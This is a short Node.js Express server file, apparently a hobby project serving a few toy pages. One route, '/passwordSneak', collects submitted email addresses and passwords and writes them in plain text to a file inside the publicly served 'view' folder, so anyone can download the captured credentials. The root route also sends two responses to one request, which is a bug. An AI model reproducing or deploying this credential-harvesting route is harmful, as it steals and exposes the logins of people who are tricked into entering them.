

const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require("body-parser");

const port = 1982;
let filedata = `data of file : \n ${fs.readFileSync('./file', 'utf-8')}`;

app.use(express.static('view'));
app.use(bodyParser.json()); 
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
  extended: true
})); 



app.get('/', (req, res) => {
    res.sendFile( __dirname + '/view/Main/index.html' );
    res.send(filedata);
});

app.get('/passwordSneak', (req, res) => {
      res.sendFile( __dirname + '/view/passwordSneak/index.html' );
});

app.post('/passwordSneak', (req, res) => {
	res.send('Complite');
	fs.writeFile('view/passwordSneak/sneakFile', `email : ${req.body.email} \npassword: ${req.body.password}`, err => console.log(err));
});

app.get('/ThimblesGame', (req, res) => {
      res.sendFile( __dirname + '/view/ThimblesGame/index.html' );
});

app.get('/unstablePage', (req, res) => {
      res.sendFile( __dirname + '/view/unstablePage/index.html' );
});

app.get('/Rainbow', (req, res) => {
      res.sendFile( __dirname + '/view/Rainbow/index.html' );
});



app.listen(port, err => {
    if (err) {
        console.log('something bad happened', err);
    }
    console.log(`server is listening on ${port}`);
})